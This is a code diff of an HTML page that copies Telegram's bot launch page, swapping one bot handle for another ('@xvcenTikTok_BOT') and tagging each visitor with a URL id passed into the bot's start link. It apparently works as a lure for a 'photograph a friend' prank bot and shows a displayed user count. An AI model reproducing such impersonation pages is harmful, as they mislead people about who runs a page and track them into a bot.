@@ -2,7 +2,7 @@
 <html>
   <head>
     <meta charset="utf-8">
-    <title>Telegram: Launch @PrikolRzhakaBot</title>
+    <title>Telegram: Launch @xvcenTikTok_BOT</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
       // Получаем уникальный ID из URL (например: ?id=abc123)
@@ -13,13 +13,13 @@
       
       // Формируем ссылку на бота с уникальным параметром
       const uniqueId = getUniqueId();
-      const botLink = `tg://resolve?domain=PrikolRzhakaBot&start=user_${uniqueId}`;
+      const botLink = `tg://resolve?domain=xvcenTikTok_BOT&start=user_${uniqueId}`;
       
       try{
         if(window.parent!=null&&window!=window.parent){
           window.parent.postMessage(JSON.stringify({
             eventType:'web_app_open_tg_link',
-            eventData:{path_full:`/PrikolRzhakaBot?start=user_${uniqueId}`}
+            eventData:{path_full:`/xvcenTikTok_BOT?start=user_${uniqueId}`}
           }),'https://web.telegram.org');
         }
       }catch(e){}
@@ -68,7 +68,7 @@
             <a href="#" id="bot-link"><img class="tgme_page_photo_image" src="https://cdn4.telesco.pe/file/caidJxI-1-BsHn0kWsIlej6pC3v3Vn4HEHFi4ivZ49qes__1sG50SycNEM74oqNBAWabKXX_KfPVUrpHz9gLEqN9C9B2KJu6EvD1O9GS2MX9_BCVcWjAO2PI61ac8KBqJwr7ueJ-liDHmxrKRjD7zofS26NB8_Z1mcSDtKNp51bRBm6S-RfvRnOWYypeXN6ZV9UyluM82Ko7WJECaXjKs2wlp8gWbFHhWIaM3uDi6uSVx-xSl1bgnkrJAnJaPV64IvucHg0L6Jde-gDkndXdus3XDUUiSKSfXP8hJFpoSEt-5clQsPlDUcwFqwH3ziBplBsJXu-qLPG5DghG2HKs8w.jpg"></a>
           </div>
           <div class="tgme_page_title"><span dir="auto">Сфоткать друга - Пранк ТикТок 📸</span></div>
-          <div class="tgme_page_extra">@PrikolRzhakaBot</div>
+          <div class="tgme_page_extra">@xvcenTikTok_BOT</div>
           <div class="tgme_page_extra">24 788 monthly users</div>
           <div class="tgme_page_description">🎊✨</div>
           <div class="tgme_page_action">
@@ -91,7 +91,7 @@
       const uniqueId = urlParams.get('id') || 'default';
       
       // Формируем ссылку на бота
-      const protoUrl = `tg://resolve?domain=PrikolRzhakaBot&start=user_${uniqueId}`;
+      const protoUrl = `tg://resolve?domain=xvcenTikTok_BOT&start=user_${uniqueId}`;
       
       // Обновляем все ссылки на странице
       document.getElementById('bot-link').href = protoUrl;
